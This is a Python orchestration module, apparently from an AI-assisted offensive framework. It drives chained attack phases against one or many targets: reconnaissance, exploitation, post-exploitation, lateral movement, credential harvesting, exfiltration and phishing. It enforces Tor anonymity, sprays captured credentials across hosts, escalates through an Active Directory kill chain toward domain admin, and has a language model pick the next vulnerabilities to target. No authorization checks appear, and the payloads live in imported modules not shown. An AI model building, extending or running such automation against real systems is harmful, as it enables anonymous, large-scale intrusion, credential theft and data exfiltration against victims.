import asyncio, json, time, hashlib, os, sys, logging

sys.path.insert(0, str(os.path.join(os.path.dirname(__file__), "..", "..")))

from orchestrator.providers import call_model
from orchestrator.brain.adaptive_brain import get_analytics
from orchestrator.brain.neural_memory import (
    store_episodic, retrieve_episodic, store_semantic,
    store_target_profile, update_target_stats,
)
from orchestrator.brain.anonymity_guard import AnonymityGuard
from orchestrator.brain.target_profiler import profile_target
from orchestrator.audit_trail import record_event
from orchestrator.brain.target_state import (
    build_target_state, summarize_target_state,
    AttackGraph, CompromiseLevel,
)
from orchestrator.brain.phases import PHASE_EXECUTORS, Finding, PhaseResult
from orchestrator.engagement_queue import get_queue
from orchestrator.chains.credential_spray import spray, _extract_creds, _extract_targets
from orchestrator.chains.ad_kill_chain import run_chain as run_ad_kill_chain
from orchestrator.hardening.circuit_breaker import get_breaker
from orchestrator.hardening.rate_limiter import get_limiter
from orchestrator.hardening.timeout_guard import get_timeout_guard

logger = logging.getLogger("autonomous")

PHASES = ["recon", "scan", "exploit", "postex", "lateral", "credential", "exfil", "phish"]


async def handle(target: str, phases: list = None, no_proxy: bool = False, **kwargs) -> dict:
    if phases is None:
        phases = PHASES

    results = {
        "target": target, "phases": {}, "analytics": {},
        "anonymity": {}, "profile": {}, "timestamp": time.time(),
        "chain_hash": hashlib.sha256(f"{target}:{time.time()}".encode()).hexdigest()[:12],
    }

    if no_proxy:
        results["anonymity"] = {"tor_active": False, "proxy_ok": False,
                                "strategy": "bypassed", "note": "Proxy preflight skipped (no_proxy=True)"}
        logger.warning(f"  ⚠ Proxy preflight bypassed for {target} — identity exposed")
    else:
        guard = AnonymityGuard(strategy="tor", rotation_interval=300)
        try:
            anon_status = guard.enforce(target=target)
            results["anonymity"] = anon_status
        except RuntimeError as e:
            results["anonymity"] = {"error": str(e), "tor_active": False}
            return results

    try:
        profile = profile_target(target)
        results["profile"] = profile
        store_target_profile(target, profile.get("classification", {}))
    except Exception as e:
        results["profile"] = {"error": str(e), "target": target}
        results["anonymity"]["profile_warning"] = str(e)

    attack_graph = AttackGraph(target)
    attack_graph.add_host(target, criticality=9.0)

    record_event("engagement_start", target=target, phase="init", verdict="started")

    all_findings: list[Finding] = []

    for phase_name in phases:
        executor = PHASE_EXECUTORS.get(phase_name)
        if not executor:
            results["phases"][phase_name] = {
                "success": False, "error": f"No executor for phase: {phase_name}",
            }
            continue

        breaker_key = f"{target}:{phase_name}"
        if not get_breaker().allow(breaker_key):
            logger.info(f"  ⛔ {phase_name.upper()} PHASE — circuit breaker OPEN, skipping")
            results["phases"][phase_name] = {
                "success": False, "error": "circuit breaker open",
                "latency": 0, "skipped": True,
            }
            continue

        logger.info(f"  ▶ {phase_name.upper()} PHASE")
        guard = get_timeout_guard()
        t0 = time.time()
        try:
            phase_result = await guard.run(
                f"phase_{phase_name}",
                executor(target, all_findings),
                timeout=guard.get_timeout(f"phase_{phase_name}"),
            )
        except Exception as e:
            phase_result = PhaseResult(
                phase=phase_name, success=False,
                error=str(e), latency=time.time() - t0,
            )

        all_findings.extend(phase_result.findings)

        if phase_result.success:
            get_breaker().record_success(breaker_key)
        else:
            get_breaker().record_failure(breaker_key)

        strategist_output = ""
        if phase_result.success and phase_result.findings:
            try:
                finding_summary = "\n".join(
                    f"- [{f.severity.value}] {f.type}: {f.description[:200]}"
                    for f in phase_result.findings[:10]
                )
                strat_msgs = [{"role": "user", "content": (
                    f"[STRATEGIST — {phase_name.upper()} RESULTS]\n"
                    f"Target: {target}\n\n"
                    f"Findings:\n{finding_summary}\n\n"
                    f"The next phase is one of: {[p for p in phases if p != phase_name]}\n"
                    "Based on these results, what should the next phase focus on?\n"
                    "Be specific: which ports, endpoints, or vulnerabilities to prioritize."
                )}]
                strategist_output = await call_model("auto", strat_msgs, max_tokens=512, temperature=0.3)
            except Exception:
                pass

        latency = time.time() - t0
        results["phases"][phase_name] = {
            "success": phase_result.success,
            "findings": [f.to_dict() for f in phase_result.findings],
            "summary": phase_result.summary,
            "latency": round(latency, 2),
            "error": phase_result.error,
            "strategist": strategist_output[:1000] if strategist_output else "",
        }

        store_episodic(
            event_type=phase_name, target=target, model="executor",
            context=phase_name, input_data=target,
            output_summary=phase_result.summary,
            success=phase_result.success, score=1.0 if phase_result.success else 0.0,
            latency=latency,
        )
        update_target_stats(target, phase_result.success)
        record_event(f"phase:{phase_name}", target=target, phase=phase_name,
                     verdict="pass" if phase_result.success else "fail")

        if phase_result.success and phase_name in ("exploit", "postex"):
            attack_graph.compromise(target, CompromiseLevel.LOW_PRIVILEGE)

        if phase_name in ("credential", "lateral") and phase_result.success:
            creds = _extract_creds(all_findings)
            hosts = _extract_targets(all_findings)
            if creds:
                spray_findings = await spray(creds, hosts, primary_target=target, findings=all_findings)
                all_findings.extend(spray_findings)
                results["phases"].setdefault("credential_spray", {}).update({
                    "success": len(spray_findings) > 0,
                    "findings": [f.to_dict() for f in spray_findings],
                    "creds_tested": len(creds),
                    "hosts_tested": len(hosts),
                })

            is_ad = any("domain" in (f.description + f.evidence).lower() or
                        f.type in ("domain_info", "domain_controller", "kerberos")
                        for f in all_findings)
            if is_ad and (creds or hosts):
                logger.info(f"  ▶ AD KILL CHAIN — target appears to be AD domain")
                ad_chain_result = await run_ad_kill_chain(target, all_findings)
                results["phases"]["ad_kill_chain"] = ad_chain_result
                for fd in ad_chain_result.get("findings", []):
                    all_findings.append(Finding(**fd) if isinstance(fd, dict) else fd)
                if ad_chain_result.get("dominion_achieved"):
                    attack_graph.compromise(target, CompromiseLevel.DOMAIN_ADMIN)

    results["analytics"] = get_analytics()
    history = retrieve_episodic(target=target, limit=20)
    results["memory"] = {"episodes_retrieved": len(history)}
    results["total_findings"] = len(all_findings)

    return results


async def handle_multi(targets: list[str], phases: list = None, parallel: bool = False, no_proxy: bool = False) -> dict:
    queue = get_queue()
    for target in targets:
        queue.enqueue(target, phases or PHASES)

    if parallel:
        tasks = [handle(t, phases, no_proxy=no_proxy) for t in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        combined = {}
        for t, r in zip(targets, results):
            if isinstance(r, Exception):
                combined[t] = {"error": str(r)}
            else:
                combined[t] = r
        return multi_results(targets, combined)
    else:
        results = {}
        for target in targets:
            r = await handle(target, phases, no_proxy=no_proxy)
            results[target] = r
            queue.update(
                next((e.id for e in queue.list() if e.target == target), ""),
                status="complete", result=r,
                findings_count=r.get("total_findings", 0),
            )
        return multi_results(targets, results)


async def handle_queue_loop():
    queue = get_queue()
    await queue.run_loop(handle)


def multi_results(targets: list[str], results: dict) -> dict:
    total_findings = sum(r.get("total_findings", 0) for r in results.values() if isinstance(r, dict))
    successes = sum(1 for r in results.values() if isinstance(r, dict) and r.get("anonymity", {}).get("tor_active"))
    return {
        "targets": targets,
        "total_targets": len(targets),
        "total_findings": total_findings,
        "successful_engagements": successes,
        "results": results,
        "timestamp": time.time(),
    }
